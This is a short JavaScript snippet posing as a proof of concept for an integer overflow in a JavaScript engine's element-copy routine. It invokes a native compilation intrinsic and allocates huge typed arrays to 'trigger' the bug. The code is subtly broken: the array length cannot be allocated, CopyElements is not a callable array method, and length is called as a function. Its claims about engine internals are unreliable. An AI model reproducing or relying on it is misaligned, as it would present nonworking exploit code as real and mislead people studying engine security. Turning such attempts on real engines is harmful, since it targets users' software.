(function compileBaseline() {
  // Enable native compilation to bypass JS checks
  %CompileBaseline(function() {
    // Create a large array to cause overflow in length calculation
    const largeLen = 2 * Number.MAX_SAFE_INTEGER + 10;
    const src = new Uint8Array(largeLen);
    const dst = new Uint8Array(largeLen);
    // Attempt to copy elements; this should trigger integer overflow in CopyElements
    dst.CopyElements(src, 0, src.length(), dst, 0, largeLen);
  });
})();
